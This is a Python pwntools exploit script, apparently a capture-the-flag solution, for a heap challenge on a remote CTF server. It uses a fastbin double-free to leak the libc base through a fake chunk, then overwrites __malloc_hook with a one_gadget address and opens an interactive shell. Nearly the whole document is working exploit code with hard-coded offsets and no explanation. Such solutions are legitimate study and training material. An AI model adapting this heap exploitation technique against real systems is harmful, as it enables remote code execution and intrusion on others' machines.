from pwn import *

r = remote("csie.ctf.tw", 10133)
# r = remote("127.0.0.1", 8888)

def new(size, data):
	r.sendlineafter("> ", "1")
	r.sendlineafter(": ", str(size))
	r.sendafter(": ", data)

def my_print(index):
	r.sendlineafter("> ", "2")
	r.sendlineafter(": ", str(index))
	return r.recvline()[:-1]

def delete(index):
	r.sendlineafter("> ", "3")
	r.sendlineafter(": ", str(index))

new(0x68, "a")
new(0x68, "a")
delete(0)
delete(1)
delete(0)

fake_chunk = 0x601ff5
new(0x68, p64(fake_chunk))
new(0x68, "a")
new(0x68, "a")
new(0x68, "a" * 27)

# raw_input('aaa')

# print note 5(our fake chunk) to leak libc base
libc = u64(my_print(5)[-6:].ljust(8, "\x00")) - 0x3c4620
one_gadget_off = 0xef6c4
one_gadget = libc + one_gadget_off

# raw_input('aaa')

# in libc
malloc_hook_chunk_offset = 0x3c3aed
malloc_hook_chunk = libc + malloc_hook_chunk_offset
delete(0)
delete(1)
delete(0)

new(0x68, p64(malloc_hook_chunk))
new(0x68, "a")
new(0x68, "a")
new(0x68, "a" * 0x13 + p64(one_gadget))

delete(0)
delete(0)

r.interactive()


